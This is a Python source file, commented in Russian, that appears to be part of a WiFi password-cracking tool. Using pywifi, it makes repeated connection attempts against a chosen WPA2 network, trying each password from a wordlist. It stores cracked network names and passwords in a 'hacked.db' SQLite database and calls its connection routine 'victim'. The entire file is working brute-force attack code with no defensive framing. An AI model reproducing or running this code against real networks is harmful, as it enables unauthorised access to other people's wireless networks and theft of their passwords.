import sqlite3
from pywifi import Profile, const
from libs.TFormat import tcolors
from libs.func import clear
from time import sleep
from tqdm import trange

def victim (iface, ssid, password): # Сетевой профиль
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()

    profile = iface.add_network_profile(profile)
    iface.connect(profile)
    sleep(0.1)
    while iface.status() == 3: sleep(0.1)

    if iface.status() == const.IFACE_CONNECTED:
        return True
    else: return False

def brutforce(iface, ssid):
    connection = sqlite3.connect('files\\hacked.db')
    cursor = connection.cursor()

    # Проверка наличия выбранной сети в базе данных
    cursor.execute('CREATE TABLE IF NOT EXISTS Networks (id INTEGER PRIMARY KEY,\
                   ssid TEXT NOT NULL, password TEXT NOT NULL)')
    cursor.execute('SELECT ssid FROM Networks WHERE ssid = ?', (ssid,))
    usr_sel = None
    if cursor.fetchone() != None:
        while True:
            usr_sel = input(tcolors.USER + '[*] Выбранная сеть уже взломана.\
                    \n[Y] Для повторного подбора, [N] Для выхода: '\
                    + tcolors.END)
            if usr_sel.upper() == ('Y' or '[Y]'):
                break
            elif usr_sel.upper() == ('N' or '[N]'):
                print(tcolors.SUCCESS + '\n[+] Проверьте базу данных files\hacked.db' + tcolors.END)
                connection.close()
                return 0
            else:
                print(tcolors.ERROR + '[-] Введено неверное значение. Попробуйте еще раз'\
                      + tcolors.END)
                continue
    # ----------------------------------------------
    
    clear()
    print(tcolors.PROC)
    passwords = open('files\\words.txt', 'r')
    l = len(passwords.readlines())
    passwords.seek(0)
    count = 0

    with trange(l, dynamic_ncols=True, desc=(f"[~] Попытка взлома {ssid}..."),\
                bar_format=(tcolors.PROC + '{l_bar}{bar}{r_bar}'), unit='pwd') as bar:
        for pwd in passwords:
            if victim(iface, ssid, pwd.rstrip()) == True:
                bar.update(l - count)
                bar.close()
                sleep(0.2)
                clear()
                if usr_sel == None:
                        cursor.execute('SELECT COUNT(*) FROM Networks')
                        id = cursor.fetchall()[0]
                        for i in id:
                            id = i
                        cursor.execute('INSERT INTO Networks (id, ssid, password) VALUES\
                                       (?, ?, ?)', (id + 1, ssid, pwd.rstrip()))
                        connection.commit()
                else:
                    cursor.execute('UPDATE Networks SET password = ? WHERE ssid = ?',\
                                   (pwd.rstrip(), ssid))
                    connection.commit()
                print(tcolors.SUCCESS +\
                      f"[+] Успешное подключение!\nПароль: {pwd.rstrip()}\
                      \n\n[+] Данные записаны в files\hacked.db" + tcolors.END)
                connection.close()
                return 1
            else:
                bar.update(1)
                count += 1

    clear()
    connection.close()
    print(tcolors.ERROR + "[-] Не удалось подобрать пароль :(" + tcolors.END)